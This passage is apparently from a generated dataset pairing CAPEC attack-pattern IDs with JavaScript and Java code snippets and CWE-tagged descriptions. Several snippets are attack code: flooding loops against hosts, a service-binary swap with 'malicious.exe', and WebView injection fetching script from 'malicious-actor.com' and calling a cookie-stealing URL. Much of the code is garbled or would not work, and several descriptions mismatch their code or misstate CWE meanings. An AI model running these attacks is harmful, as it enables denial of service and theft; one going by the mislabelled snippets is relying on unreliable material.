        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(plaintext, signature, publicKey) {\n  const verifier = crypto.createVerify('RSA-SHA256');\n  verifier.update(plaintext);\n  const verified = verifier.verify(publicKey, signature, 'hex');\n  if (!verified) {\n    // CWE-347: Improper Verification of Cryptographic Signature\n    // CWE-693: Protection Mechanism Failure\n    console.log('Signature is invalid');\n    return false;\n  }\n\n  // CWE-311: Missing Encryption of Sensitive Data\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const sensitiveData = 'creditCardNumber=1234-5678-9012-3456';\n  return sensitiveData;\n}\n\nfunction processSignedData(signedData) {\n  // CWE-196: Unsigned to Signed Conversion Error\n  const unsignedBuffer = Buffer.from(signedData, 'hex');\n  const signedBuffer = unsignedBuffer.readInt32BE(0);\n  console.log(signedBuffer);\n  return signedBuffer;\n}\n\nconst publicKey = '-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxX7X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X3X\\n-----END PUBLIC KEY-----';\nconst plaintext = 'This is some sensitive data';\nconst signature = '1234567890abcdef';\n\nverifySignature(plaintext, signature, publicKey);\nprocessSignedData(signature);",
        "description": "This code snippet demonstrates the CAPEC of exploiting the complexity of a data structure that allows for both signed and unsigned content. It includes CWE-693: Protection Mechanism Failure, CWE-311: Missing Encryption of Sensitive Data, CWE-319: Cleartext Transmission of Sensitive Information, CWE-196: Unsigned to Signed Conversion Error, and CWE-347: Improper Verification of Cryptographic Signature. The code fails to properly verify a cryptographic signature, transmits sensitive data in cleartext, and incorrectly converts unsigned data to signed data, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "478",
        "code_snippet": "const { spawn } = require('child_process');\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\nconst servicePath = 'C:\\\\Windows\\\\System32\\\\services.exe';\nconst maliciousBinaryPath = 'C:\\\\malicious.exe';\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst impersonationLevel = 'identified';\n\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nconst adsPath = 'C:\\\\Windows\\\\System32\\\\services.exe:malicious.exe';\n\n// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nconst optimizationFlag = '--optimize-for-size';\n\n// CWE-15: External Control of System or Configuration Setting\nconst configSetting = 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate';\n\ntry {\n  // Modify the execution parameters of the Windows service\n  fs.writeFileSync(servicePath, fs.readFileSync(maliciousBinaryPath));\n  \n  // Use impersonation to run the malicious binary with elevated privileges\n  const maliciousProcess = spawn('cmd.exe', ['/c', maliciousBinaryPath], {\n    impersonationLevel,\n  });\n  \n  // Use alternate data streams to hide the malicious binary\n  fs.writeFileSync(adsPath, fs.readFileSync(maliciousBinaryPath));\n  \n  // Disable processor optimization to prevent security-critical code removal\n  spawn('cmd.exe', ['/c', 'set', 'COMSPEC=', optimizationFlag]);\n  \n  // Externally control the system configuration setting\n  const reg = require('regedit');\n  reg.set({\n    'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate': {\n      'AUOptions': '2',\n    },\n  });\n} catch (error) {\n  console.error(error);\n}",
        "description": "This code snippet demonstrates a vulnerability in access control that allows an adversary to modify the execution parameters of a Windows service, executing a malicious binary in place of an existing service. It utilizes CWE-284, CWE-520, CWE-69, CWE-1037, and CWE-15 to achieve this goal."
    },
    {
        "capec_id": "479",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false\n};\n\nconst req = https.request(options, (res) => {\n  console.log('statusCode:', res.statusCode);\n  console.log('headers:', res.headers);\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(e);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a vulnerable HTTPS request that disables certificate verification, allowing an adversary to install a new root certificate on a compromised system and spoof a legitimate website, potentially leading to the collection of login credentials. The code uses the 'https' module with the 'rejectUnauthorized' option set to 'false', which bypasses the default behavior of verifying the certificate. This is an example of CWE-284 (Improper Access Control), CWE-295 (Improper Certificate Validation), CWE-296 (Improper Following of a Certificate's Chain of Trust), CWE-297 (Improper Validation of Certificate with Host Mismatch), and CWE-599 (Missing Validation of OpenSSL Certificate)."
    },
    {
        "capec_id": "480",
        "code_snippet": "const vm = require('vm');\n\nconst untrustedCode = 'process.mainModule.require(\"child_process\").execSync(\"whoami\");';\n\ntry {\n  vm.runInNewContext(untrustedCode, {});\n} catch (e) {\n  console.error(e);\n}\n\n// Shared microarchitectural predictor state vulnerability\nconst secretData = 'TOP_SECRET_INFO';\nconst predictorState = {};\nObject.setPrototypeOf(predictorState, secretData);\n\n// Improper isolation or compartmentalization\nconst untrustedLibrary = require(\"untrusted-library\");\nuntrustedLibrary.executeCommands();\n\n// Process control vulnerability\nconst exec = require(\"child_process\").exec;\nexec('bash -c \"whoami\"');",
        "description": "This code snippet demonstrates a virtual machine escape vulnerability. It creates a new VM context and runs untrusted code within it, which can potentially access sensitive information or execute unauthorized commands. The code also includes examples of shared microarchitectural predictor state vulnerability, improper isolation or compartmentalization, and process control vulnerability, which can be exploited to gain unauthorized access or execute malicious code."
    },
    {
        "capec_id": "481",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'attacker.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'Host': 'victim.com'\n  }\n};\n\nconst req = https.request(options, (res) => {\n  console.log('statusCode:', res.statusCode);\n  console.log('headers:', res.headers);\n});\n\nreq.on('error', (e) => {\n  console.error(e);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates the concept of Domain Fronting, a technique used to route traffic to an inappropriate destination by providing contradictory domain names. The code creates an HTTPS request to 'attacker.com' but specifies 'victim.com' in the Host header, potentially allowing an attacker to route traffic to 'victim.com' instead of 'attacker.com'. This code embodies CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), CWE-444 (Inconsistent Interpretation of HTTP Requests), CWE-942 (Permissive Cross-domain Policy with Untrusted Domains), CWE-647 (Use of Non-Canonical URL Paths for Authorization Decisions), and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "482",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: No encryption, sensitive information is sent in cleartext\n    console.log(`Received: ${data}`);\n    // CWE-924: No message integrity check, assume message is not modified\n    processMessage(data);\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction processMessage(data) {\n  // CWE-602: Client-side enforcement of server-side security, rely on client to send valid data\n  if (data.toString() === 'SYN') {\n    // CWE-770: No limit on resource allocation, allocate resources without restrictions\n    allocateResource();\n  }\n}\n\nfunction allocateResource() {\n  // CWE-406: Insufficient control of network message volume, no limit on transmitted traffic\n  for (let i = 0; i < 10000; i++) {\n    sendResponse('SYN-ACK');\n  }\n}\n\nfunction sendResponse(data) {\n  const client = new net.Socket();\n  client.connect(8080, () => {\n    client.write(data);\n  });\n}",
        "description": "A vulnerable TCP server in Node.js that is susceptible to a flooding attack using TCP SYN messages, exploiting weaknesses in resource allocation, message integrity, and network message volume control."
    },
    {
        "capec_id": "484",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xmlparser = require('xml2js');\n\napp.post('/api/xml', (req, res) => {\n  const xml = req.body.xml;\n  const parser = new xmlparser.Parser();\n  parser.parseString(xml, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n    } else {\n      // No validation of XML against a proper schema\n      const data = result.data;\n      // Trusting the client to implement security mechanisms\n      const isAdmin = data.isAdmin;\n      if (isAdmin) {\n        res.send('Welcome, admin!');\n      } else {\n        res.send('Access denied');\n      }\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable XML parser that does not validate the XML against a proper schema (CWE-112) and relies on the client to implement security mechanisms (CWE-602). An attacker can inject malicious XML data, potentially leading to authentication bypass (CWE-592) or XML injection (CWE-91). Additionally, the code does not restrict XML external entity references, making it vulnerable to CWE-611."
    },
    {
        "capec_id": "485",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-330: Insufficiently random values\nfunction generateKey() {\n  return crypto.createDiffieHellman(512).generateKeys();\n}\n\n// CWE-290: Authentication Bypass by Spoofing\nfunction authenticate(user, signature) {\n  const publicKey = generateKey().publicKey;\n  return crypto.createVerify('SHA256').update(user).verify(publicKey, signature);\n}\n\n// CWE-294: Authentication Bypass by Capture-replay\nfunction captureReplayAttack(user, signature) {\n  return authenticate(user, signature);\n}\n\n// CWE-301: Reflection Attack in an Authentication Protocol\nfunction reflectionAttack(user, signature) {\n  return authenticate(user, signature);\n}\n\n// CWE-1241: Use of Predictable Algorithm in Random Number Generator\nfunction predictableRandomNumber() {\n  return Math.floor(Math.random() * 100);\n}\n\n// CAPEC: Obtaining authoritative signer's private signature key\nfunction obtainPrivateSignatureKey() {\n  const privateKey = generateKey().privateKey;\n  return privateKey;\n}\n\n// Forging signatures with the obtained private key\nfunction forgeSignature(user) {\n  const privateKey = obtainPrivateSignatureKey();\n  return crypto.createSign('SHA256').update(user).sign(privateKey);\n}\n",
        "description": "This code snippet demonstrates a vulnerable authentication system that uses insufficiently random values, is susceptible to authentication bypass by spoofing and capture-replay attacks, and employs a predictable random number generator. An attacker can obtain the authoritative signer's private signature key by exploiting these weaknesses and then use it to forge signatures, misleading victims into performing actions that benefit the attacker."
    },
    {
        "capec_id": "486",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.bind(8080, () => {\n  console.log('UDP server listening on port 8080');\n});\n\nserver.on('message', (message, remoteInfo) => {\n  // CWE-319: Cleartext transmission of sensitive information\n  console.log(`Received message from ${remoteInfo.address}:${remoteInfo.port}: ${message}`);\n  // CWE-941: Incorrectly specified destination in a communication channel\n  const spoofedSource = '192.168.1.100';\n  const packet = Buffer.from(`Flooding attack from ${spoofedSource}`);\n  server.send(packet, 0, packet.length, 8080, '192.168.1.1', (error) => {\n    if (error) {\n      console.log(error);\n    } else {\n      console.log(`Packet sent to 192.168.1.1:8080`);\n    }\n  });\n});\n\n// CWE-770: Allocation of resources without limits or throttling\nsetInterval(() => {\n  for (let i = 0; i < 1000; i++) {\n    server.send(Buffer.from(`Flooding attack packet ${i}`), 0, 20, 8080, '192.168.1.1', (error) => {\n      if (error) {\n        console.log(error);\n      }\n    });\n  }\n}, 10);\n\n// CWE-406: Insufficient control of network message volume (network amplification)\nsetInterval(() => {\n  for (let i = 0; i < 100; i++) {\n    server.send(Buffer.from(`Amplified packet ${i}`), 0, 20, 8080, '192.168.1.1', (error) => {\n      if (error) {\n        console.log(error);\n      }\n    });\n  }\n}, 10);\n\n// CWE-924: Improper enforcement of message integrity during transmission\nconst corruptedPacket = Buffer.from('Corrupted packet');\nserver.send(corruptedPacket, 0, corruptedPacket.length, 8080, '192.168.1.1', (error) => {\n  if (error) {\n    console.log(error);\n  } else {\n    console.log('Corrupted packet sent');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a UDP flooding attack, which can be used to deny legitimate users access to a service by consuming available network bandwidth. The code creates a UDP server that listens on port 8080 and sends packets to a target IP address. The code also includes vulnerabilities related to CWE-319, CWE-941, CWE-770, CWE-406, and CWE-924, making it susceptible to various types of attacks."
    },
    {
        "capec_id": "487",
        "code_snippet": "const icmp = require('icmp');\nconst net = require('net');\n\nlet icmpSocket = icmp.createSocket();\nlet serverSocket = net.createServer();\n\nserverSocket.listen(0, () => {\n  console.log('Server listening on port ' + serverSocket.address().port);\n});\n\nsetInterval(() => {\n  for (let i = 0; i < 1000; i++) {\n    icmpSocket.send('echo', 0, 0, 0, '8.8.8.8', (error) => {\n      if (error) {\n        console.log('Error sending ICMP packet: ' + error);\n      }\n    });\n  }\n}, 1000);\n\nserverSocket.on('connection', (socket) => {\n  socket.on('data', (data) => {\n    console.log('Received data: ' + data);\n    // No input validation or sanitization\n    eval(data);\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable server that can be exploited by an adversary to execute a flooding attack using the ICMP protocol. The server creates an ICMP socket and a TCP server socket, and then sends ICMP echo requests to a target IP address at a high rate. The server also listens for incoming TCP connections and evaluates any received data without input validation or sanitization, making it vulnerable to code injection attacks. The lack of throttling or rate limiting on the ICMP socket allocation and the TCP server socket connections makes the server vulnerable to resource exhaustion. Additionally, the use of eval() function makes the server vulnerable to code injection attacks."
    },
    {
        "capec_id": "488",
        "code_snippet": "const http = require('http');\nconst express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n    const query = req.query;\n    const largeData = new Array(1000000).fill(0);\n    res.json(largeData);\n});\n\nhttp.createServer(app).listen(3000, () => {\n    console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web service that can be exploited using HTTP flooding attacks. The '/api/data' endpoint returns a large amount of data (1 million elements) without any throttling or limits, making it vulnerable to CWE-770. The use of the GET method with sensitive query strings (CWE-598) and the lack of input validation make it susceptible to HTTP Request Smuggling (CWE-444) and Server-Side Request Forgery (CWE-918). The server's resource pool is also insufficient to handle peak demand, making it vulnerable to CWE-410. An attacker can exploit these vulnerabilities by sending a large number of requests to the '/api/data' endpoint, consuming the server's resources and denying access to legitimate users."
    },
    {
        "capec_id": "489",
        "code_snippet": "const https = require('https');\n\nlet connections = 0;\n\nfunction floodServer() {\n  const options = {\n    hostname: 'example.com',\n    port: 443,\n    path: '/',\n    method: 'GET'\n  };\n\n  const req = https.request(options, (res) => {\n    connections++;\n    res.on('data', () => {});\n    res.on('end', () => {\n      connections--;\n      if (connections < 1000) {\n        floodServer();\n      }\n    });\n  });\n\n  req.on('error', (err) => {\n    console.error(err);\n  });\n\n  req.end();\n}\n\nfor (let i = 0; i < 1000; i++) {\n  floodServer();\n}",
        "description": "This code snippet demonstrates a flooding attack on an HTTPS server, exploiting the asymmetric relationship between client and server processing power. It creates a large number of HTTPS requests without throttling, exhausting the server's resources and potentially leading to a crash or denial of service. The code is vulnerable to CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-410 (Insufficient Resource Pool), CWE-1125 (Excessive Attack Surface), and CWE-400 (Uncontrolled Resource Consumption)."
    },
    {
        "capec_id": "490",
        "code_snippet": "const dns = require('dns');\nconst targetServer = 'target-server.com';\nconst thirdPartyService = 'third-party-service.com';\n\nfunction amplifyAttack() {\n    for (let i = 0; i < 1000; i++) {\n        dns.resolve(thirdPartyService, 'ANY', (err, records) => {\n            if (err) {\n                console.error(err);\n            } else {\n                // Spoof the source address to be that of the target server\n                const spoofedRequest = {\n                    src: targetServer,\n                    dst: thirdPartyService,\n                    data: 'large-payload'\n                };\n                // Send the request to the third-party service\n                dns.resolve(spoofedRequest.dst, 'ANY', (err, records) => {\n                    if (err) {\n                        console.error(err);\n                    } else {\n                        // The third-party service will respond with a large payload\n                        // which will be sent to the target server\n                        console.log(`Amplified attack sent to ${targetServer}`);\n                    }\n                });\n            }\n        });\n    }\n}\n\namplifyAttack();",
        "description": "This code snippet demonstrates an amplification attack where an adversary sends a small request to a third-party service, spoofing the source address to be that of the target server. The third-party service responds with a large payload, which is then sent to the target server, overwhelming it with traffic. This code exploits CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-405 (Asymmetric Resource Consumption), CWE-406 (Insufficient Control of Network Message Volume), CWE-408 (Incorrect Behavior Order: Early Amplification), and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "491",
        "code_snippet": "function vulnerableFunction(entity) {\n  let result = '';\n  for (let i = 0; i < 1000000; i++) {\n    result += entity;\n  }\n  return result;\n}\n\nlet largeEntity = '';\nfor (let i = 0; i < 10000; i++) {\n  largeEntity += 'a';\n}\n\nvulnerableFunction(largeEntity);",
        "description": "This JavaScript code snippet demonstrates the CAPEC-196 attack pattern. The vulnerableFunction takes an entity as an argument and performs a large number of concatenations, leading to excessive memory allocation. The largeEntity variable is defined with a large number of 'a' characters, which is then passed to the vulnerableFunction, causing a denial of service situation due to excessive memory allocation."
    },
    {
        "capec_id": "492",
        "code_snippet": "function validateInput(input) {\n  var regex = /^(a+)*$/;\n  if (regex.test(input)) {\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// Example usage:\nvar input = \"a\".repeat(10000);\nvalidateInput(input);",
        "description": "This JavaScript code snippet demonstrates a vulnerable regular expression implementation that can lead to uncontrolled resource consumption (CWE-400) and inefficient regular expression complexity (CWE-1333). The regular expression /^(a+)*$/ has an exponential worst-case computational complexity, making it prone to catastrophic backtracking. The function validateInput() takes an input string and checks if it matches the regular expression. In the example usage, a large input string is created by repeating the character 'a' 10,000 times, which can cause the regular expression engine to consume excessive CPU cycles and eventually lead to a denial-of-service condition."
    },
    {
        "capec_id": "493",
        "code_snippet": "const soap = require('soap');\nconst express = require('express');\nconst app = express();\n\napp.post('/soap', (req, res) => {\n  const xml = req.body;\n  const parser = new DOMParser();\n  const xmlDoc = parser.parseFromString(xml, 'text/xml');\n  const arrayDecl = xmlDoc.getElementsByTagName('array')[0];\n  const arraySize = parseInt(arrayDecl.getAttribute('size')); // CWE-130: Improper Handling of Length Parameter Inconsistency\n  const arrayElements = [];\n  for (let i = 0; i < arraySize; i++) {\n    arrayElements.push({}); // CWE-1325: Improperly Controlled Sequential Memory Allocation\n  }\n  // CWE-611: Improper Restriction of XML External Entity Reference\n  const externalEntity = xmlDoc.createElement('xi:include');\n  externalEntity.href = 'http://example.com/malicious.xml';\n  xmlDoc.documentElement.appendChild(externalEntity);\n  // CWE-651: Exposure of WSDL File Containing Sensitive Information\n  const wsdl = xmlDoc.getElementsByTagName('wsdl:definitions')[0];\n  if (wsdl) {\n    console.log(wsdl.innerHTML); // sensitive information exposed\n  }\n  // CWE-770: Allocation of Resources Without Limits or Throttling\n  const soapServer = new soap.WSSecurity();\n  soapServer.addWSSecurity(xmlDoc);\n  res.send(xmlDoc.toString());\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable SOAP service that is susceptible to a denial-of-service attack due to improper handling of large array declarations. The service allocates memory for the array elements without imposing any restrictions, leading to memory exhaustion. Additionally, the code exposes sensitive information through the WSDL file and is vulnerable to XML external entity injection."
    },
    {
        "capec_id": "494",
        "code_snippet": "const net = require('net');\nconst tcp = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-770: No limit on the number of resources allocated\n    const fragments = [];\n    for (let i = 0; i < 1000; i++) {\n      fragments.push(Buffer.alloc(100));\n    }\n    // CWE-404: Improper resource shutdown or release\n    socket.write(fragments[0]);\n    socket.destroy();\n    // CWE-444: Inconsistent interpretation of HTTP requests\n    const httpReq = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n';\n    const malformedReq = httpReq.replace('HTTP/1.1', 'HTTP/1.0\\r\\nX-Test: test');\n    socket.write(malformedReq);\n    // CWE-319: Cleartext transmission of sensitive information\n    const sensitiveData = 'username=password';\n    socket.write(sensitiveData);\n    // CWE-69: Improper handling of Windows ::DATA alternate data stream\n    const ads = ':test.txt:ADS';\n    fs.writeFileSync(ads, 'malicious data');\n  });\n});\ntcp.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This code snippet demonstrates a TCP fragmentation attack, where an adversary attempts to evade filtering rules by fragmenting TCP packets such that the headers flag field is pushed into the second fragment. The code also incorporates related CWEs, including allocation of resources without limits, improper resource shutdown or release, inconsistent interpretation of HTTP requests, cleartext transmission of sensitive information, and improper handling of Windows ::DATA alternate data stream."
    },
    {
        "capec_id": "495",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.bind(8080, () => {\n  console.log('UDP server listening on 8080');\n});\n\nserver.on('message', (message, remoteInfo) => {\n  // CWE-770: No limit on the size of the message\n  const largeMessage = new Buffer.alloc(16000, 'a');\n  server.send(largeMessage, 0, largeMessage.length, remoteInfo.port, remoteInfo.address);\n\n  // CWE-404: Not releasing the resource (socket)\n  // CWE-319: Sending sensitive information in cleartext\n  const sensitiveData = 'password123';\n  server.send(sensitiveData, 0, sensitiveData.length, remoteInfo.port, remoteInfo.address);\n\n  // CWE-406: Insufficient control of network message volume\n  for (let i = 0; i < 1000; i++) {\n    server.send(largeMessage, 0, largeMessage.length, remoteInfo.port, remoteInfo.address);\n  }\n\n  // CWE-409: Improper handling of highly compressed data\n  const compressedData = pako.gzip({ foo: 'bar' });\n  server.send(compressedData, 0, compressedData.length, remoteInfo.port, remoteInfo.address);\n});",
        "description": "This code snippet demonstrates a UDP server that is vulnerable to a UDP fragmentation attack. It allocates large resources without limits, sends sensitive information in cleartext, and does not release resources properly. It also lacks control over network message volume and improperly handles highly compressed data."
    },
    {
        "capec_id": "496",
        "code_snippet": "const icmp = require('icmp');\nconst net = require('net');\n\nlet packetCount = 0;\nlet fragmentedPackets = [];\n\nfunction craftFragmentedPacket() {\n  const packet = icmp.createPacket({\n    type: 8,\n    code: 0,\n    checksum: 0,\n    id: 1234,\n    seq: 1\n  });\n\n  // CWE-770: Allocation of Resources Without Limits or Throttling\n  // Allocate a large number of resources without restrictions\n  for (let i = 0; i < 10000; i++) {\n    fragmentedPackets.push(packet);\n  }\n}\n\nfunction sendFragmentedPackets() {\n  const socket = new net.Socket();\n\n  // CWE-404: Improper Resource Shutdown or Release\n  // Do not release resources properly\n  socket.on('close', () => {\n    // Do not release the socket\n  });\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  // Send sensitive information in cleartext\n  socket.write(fragmentedPackets);\n}\n\n// CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n// CWE-1261: Improper Handling of Single Event Upsets\n// Ignore potential hardware logic errors\n\nsetInterval(craftFragmentedPacket, 10);\nsetInterval(sendFragmentedPackets, 10);",
        "description": "This JavaScript code snippet demonstrates an ICMP Fragmentation attack, which can cause a target host to become non-responsive or crash. The code crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message and sends them to a target host. The code also includes vulnerabilities related to CWE-770, CWE-404, CWE-319, CWE-1316, and CWE-1261, which can exacerbate the attack's impact."
    },
    {
        "capec_id": "497",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst userInput = './config'; // user input, potentially malicious\nconst filePath = path.join(__dirname, userInput);\n\ntry {\n  const fileContent = fs.readFileSync(filePath, 'utf8');\n  console.log(fileContent);\n} catch (err) {\n  console.error(err);\n}\n\n// vulnerable code: allowing user input to control file path\nconst aclFile = './accessControlList.txt';\nconst aclFilePath = path.join(__dirname, userInput, aclFile);\nfs.readFile(aclFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of probing and exploration to determine if common key files exist. It uses CWE-200, CWE-529, CWE-73, CWE-426, and CWE-646. The code allows user input to control the file path, which can lead to exposure of sensitive information and access control list files to unauthorized actors. The code also relies on the file name and extension to determine the appropriate behaviors, making it vulnerable to misclassification and processing in a dangerous fashion."
    },
    {
        "capec_id": "498",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\nconst sensitiveInfo = {\n  'creditCardNumber': '1234-5678-9012-3456',\n  'address': '123 Main St'\n};\n\n// CWE-939: Improper Authorization in Handler for Custom URL Scheme\nconst customURLSchemeHandler = (url) => {\n  if (url.startsWith('myapp://')) {\n    return sensitiveInfo;\n  }\n};\n\n// CWE-222: Truncation of Security-relevant Information\nconst truncateInfo = (info) => {\n  return info.substring(0, 10);\n};\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nconst sendInfoOverNetwork = (info) => {\n  const socket = require('net').createConnection(8080, 'localhost');\n  socket.write(info);\n};\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst getSystemInfo = () => {\n  return {\n    'os': process.platform,\n    'arch': process.arch\n  };\n};\n\n// CAPEC: An adversary examines screenshot images created by iOS\nconst screenshotDir = '/private/var/mobile/Library/SplashBoard/Snapshots/';\nfs.readdir(screenshotDir, (err, files) => {\n  if (err) {\n    console.error(err);\n  } else {\n    files.forEach((file) => {\n      const filePath = path.join(screenshotDir, file);\n      fs.readFile(filePath, (err, data) => {\n        if (err) {\n          console.error(err);\n        } else {\n          const imageBuffer = Buffer.from(data, 'binary');\n          // Process the screenshot image data\n          console.log(imageBuffer);\n        }\n      });\n    });\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC attack by reading and processing screenshot images created by iOS, while also incorporating CWEs 359, 939, 222, 319, and 497. It exposes sensitive information, uses improper authorization, truncates security-relevant information, transmits sensitive data in cleartext, and exposes sensitive system information."
    },
    {
        "capec_id": "499",
        "code_snippet": "androidManifest.xml:\n\n<receiver android:name=\".MyReceiver\">\n    <intent-filter>\n        <action android:name=\"com.example.ACTION_SEND_DATA\"/>\n    </intent-filter>\n</receiver>\n\nMyReceiver.java:\n\npublic class MyReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String data = intent.getStringExtra(\"data\");\n        // Process sensitive data without verifying the intent source\n        Log.d(\"MyReceiver\", \"Received data: \" + data);\n    }\n}\n\nMainActivity.java:\n\npublic class MainActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        Intent intent = new Intent(\"com.example.ACTION_SEND_DATA\");\n        intent.putExtra(\"data\", \"sensitive_data\");\n        sendBroadcast(intent);\n    }\n}\n",
        "description": "This code snippet demonstrates a vulnerable Android application that uses an implicit intent to send sensitive data to other applications without proper verification of the intent source. The MyReceiver class receives the intent and processes the sensitive data without checking the sender's identity. The MainActivity class sends the intent using an implicit intent, making it accessible to any application that has declared an appropriate intent filter. This code is vulnerable to CWE-925, CWE-927, CWE-926, CWE-319, and CWE-924."
    },
    {
        "capec_id": "500",
        "code_snippet": "var webView = document.getElementById('webView');\n\n// CWE-749: Exposed Dangerous Method or Function\nwebView.addEventListener('load', function() {\n  var maliciousScript = document.createElement('script');\n  maliciousScript.src = 'https://malicious-actor.com/maliciousCode.js';\n  webView.contentWindow.document.body.appendChild(maliciousScript);\n});\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nfunction handleIncomingRequest(request) {\n  // No verification of the request origin\n  var xhr = new XMLHttpRequest();\n  xhr.open('GET', request.url, true);\n  xhr.send();\n}\n\n// CWE-506: Embedded Malicious Code\nfunction injectMaliciousCode() {\n  var maliciousCode = 'var xhr = new XMLHttpRequest(); xhr.open(\\'GET\\', \\'https://malicious-actor.com/stealCookies\\', true); xhr.send();';\n  webView.contentWindow.eval(maliciousCode);\n}\n\n// CWE-784: Reliance on Cookies without Validation and Integrity Checking in a Security Decision\nfunction checkCookie() {\n  var cookie = webView.contentWindow.document.cookie;\n  if (cookie.includes('authToken')) {\n    // No validation or integrity checking of the cookie\n    return true;\n  }\n  return false;\n}\n\n// CWE-602: Client-Side Enforcement of Server-Side Security\nfunction enforceSecurity() {\n  if (checkCookie()) {\n    // Relying on client-side security mechanism\n    webView.contentWindow.location.href = 'https://vulnerable-web-app.com/adminPanel';\n  }\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC where an adversary injects malicious code into a WebView component, allowing them to manipulate the DOM tree and cookies, expose sensitive information, and launch attacks against the web application. The code includes CWE-749, CWE-940, CWE-506, CWE-784, and CWE-602 vulnerabilities."
    },
    {
        "capec_id": "501",
        "code_snippet": "android.intent.action.VIEW\n\n// CWE-927: Use of Implicit Intent for Sensitive Communication\nIntent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setData(Uri.parse(\"https://example.com/login\"));\nstartActivity(intent);\n\n// CWE-925: Improper Verification of Intent by Broadcast Receiver\npublic class MaliciousReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // No verification of the intent source\n        String username = intent.getStringExtra(\"username\");\n        String password = intent.getStringExtra(\"password\");\n        // Use the sensitive data\n    }\n}\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n// CWE-926: Improper Export of Android Application Components\n// CWE-940: Improper Verification of Source of a Communication Channel\n<receiver android:name=\".MaliciousReceiver\">\n    <intent-filter>\n        <action android:name=\"android.intent.action.VIEW\" />\n    </intent-filter>\n</receiver>",
        "description": "This code snippet demonstrates the CAPEC where an adversary intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity. The malicious activity mimics the trusted activity's user interface and prompts the target to enter sensitive data. The code uses an implicit intent for transmitting sensitive data, does not properly verify the intent source, and exports the component without proper restrictions."
    },
    {
        "capec_id": "502",
        "code_snippet": "androidManifest.xml:\n\n<receiver android:name=\".MyReceiver\">\n    <intent-filter>\n        <action android:name=\"com.example.ACTION_SEND_DATA\"/>\n    </intent-filter>\n</receiver>\n\nMyReceiver.java:\n\npublic class MyReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String data = intent.getStringExtra(\"data\");\n        // process sensitive data without verifying the intent's source\n        processData(data);\n    }\n}\n\nMainActivity.java:\n\npublic class MainActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        Intent intent = new Intent(\"com.example.ACTION_SEND_DATA\");\n        intent.putExtra(\"data\", \"sensitive_data\");\n        sendBroadcast(intent);\n    }\n}",
